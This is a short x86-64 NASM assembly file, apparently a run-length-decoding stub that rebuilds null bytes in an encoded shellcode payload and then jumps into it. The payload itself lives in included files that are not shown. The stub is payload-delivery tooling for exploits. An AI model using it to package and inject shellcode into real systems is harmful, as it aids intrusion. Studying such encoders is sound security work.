BITS 64
default rel
global main
	
%include "defines.asm"

	section .text

main:	xor edi, edi
	mov esi, edi
	mov edx, edi
	
	;; final length of shellcode
	mov di, orig_len
	mov si, short_len
	
base:	lea rbx, [$ + code - base]
	mov ecx, esi		; get count for total bytes to process
	add rsi, rbx		; put source register at end of code
	add rdi, rbx		; end of final 
	add rdi, slack - 1
loop:   dec rsi			; move window
	mov al, [rsi]		; get a byte
	and al, al 		; test for zeros
	jz repl			; found some
	mov [rdi], al		;
	dec rdi			; ...
	loop loop		;
	xor ecx, ecx
	jmp code + slack	;

repl:
	dec rsi
	mov ah, [rsi]		; get count for zeros
	dec rcx
.lp:	and ah, ah		; check for end
	jz .done		; ...
	mov BYTE [rdi], 0	; write a zero
	dec rdi
	dec ah			; tick the loop counter
	jmp .lp			; ...
.done:	loop loop
	xor ecx, ecx
	jmp code + slack

%include "rled.asm"
